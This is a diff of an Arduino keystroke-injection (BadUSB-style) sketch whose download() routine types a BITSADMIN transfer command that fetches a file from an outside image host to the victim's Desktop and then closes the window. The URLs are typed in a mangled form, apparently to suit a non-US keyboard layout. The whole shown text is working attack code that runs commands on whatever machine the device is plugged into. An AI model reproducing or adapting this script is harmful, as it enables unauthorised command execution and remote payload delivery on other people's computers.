@@ -26,14 +26,18 @@ void runCmd(){
   delay(200);
   Keyboard.releaseAll();
 }
-
+// http://galeri5.uludagsozluk.com/2/bereket-tanrisi_38451_m.jpg
 void download(){
   Keyboard.print("BITSADMIN &transfer testJob &PRIORITY HIGH ");
   delay(500);
-  Keyboard.print("HTTPS?&&I/stack/Imgur/com&huT85/jpg %cd%&Desktop&test/jpg");
-  delay(2500);
+  Keyboard.print("HTTPS?&&I/Ibb/co&PDd3HTX&aa/jpg %cd%&Desktop&hello/jpg");
+  delay(2000);
   Keyboard.press(KEY_RETURN);
-  delay(300);
+  Keyboard.releaseAll();
+  delay(4000);
+  Keyboard.print("exIt");
+  delay(200);
+  Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
 }
 void loop() {
